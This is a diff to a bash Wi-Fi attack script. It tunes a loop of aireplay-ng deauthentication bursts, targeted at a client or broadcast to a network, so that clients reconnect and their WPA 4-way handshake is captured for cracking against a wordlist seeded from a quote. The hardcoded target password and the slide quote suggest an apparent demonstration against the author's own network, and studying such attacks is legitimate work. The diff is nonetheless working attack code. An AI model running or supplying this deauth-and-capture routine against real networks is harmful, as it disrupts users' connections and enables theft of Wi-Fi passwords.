@@ -21,6 +21,8 @@ CHAN=1
 QUOTE="It's like larping but in a car"   # slide quote -> wordlist seed
 TARGET_PASS="larpinginacar1"         # only used for the pre-flight sanity check; never printed
 MAX_DEAUTH_ROUNDS=40                  # ~3-4 min; plenty of time to toggle the phone manually
+DEAUTH_EVERY=5                        # deauth once per N rounds, then LISTEN — continuous
+                                     # deauth stops the client ever completing the handshake
 # Realtek out-of-tree drivers (e.g. RTL8814AU) often report "channel -1"; this
 # flag makes aireplay-ng proceed anyway. Harmless on drivers that don't need it.
 AIREPLAY_OPTS="--ignore-negative-one"
@@ -244,13 +246,20 @@ say "CAPTURING. If the injection test failed, toggle your phone's Wi-Fi OFF then
 say "ON now (or forget/rejoin '$TARGET_SSID') to force the handshake. Waiting..."
 got=0
 for i in $(seq 1 "$MAX_DEAUTH_ROUNDS"); do
-  CLIENT="$(pick_client)"
-  if [ -n "$CLIENT" ]; then
-    printf '   round %2d/%d — targeted deauth -> %s\n' "$i" "$MAX_DEAUTH_ROUNDS" "$CLIENT"
-    aireplay-ng --deauth 3 $AIREPLAY_OPTS -a "$BSSID" -c "$CLIENT" "$MON" >/dev/null 2>&1
+  # Deauth ONLY at the start of each cycle, then stay silent for the remaining
+  # rounds so the client can re-associate AND complete the 4-way handshake.
+  # Deauthing every round just kicks it off again before the handshake finishes.
+  if [ $(( (i - 1) % DEAUTH_EVERY )) -eq 0 ]; then
+    CLIENT="$(pick_client)"
+    if [ -n "$CLIENT" ]; then
+      printf '   round %2d/%d — deauth burst -> %s, now listening...\n' "$i" "$MAX_DEAUTH_ROUNDS" "$CLIENT"
+      aireplay-ng --deauth 3 $AIREPLAY_OPTS -a "$BSSID" -c "$CLIENT" "$MON" >/dev/null 2>&1
+    else
+      printf '   round %2d/%d — broadcast deauth burst, now listening...\n' "$i" "$MAX_DEAUTH_ROUNDS"
+      aireplay-ng --deauth 3 $AIREPLAY_OPTS -a "$BSSID" "$MON" >/dev/null 2>&1
+    fi
   else
-    printf '   round %2d/%d — no client seen yet, broadcast deauth\n' "$i" "$MAX_DEAUTH_ROUNDS"
-    aireplay-ng --deauth 3 $AIREPLAY_OPTS -a "$BSSID" "$MON" >/dev/null 2>&1
+    printf '   round %2d/%d — listening for handshake...\n' "$i" "$MAX_DEAUTH_ROUNDS"
   fi
   sleep 3
   if [ -f "$CAPFILE" ] && \
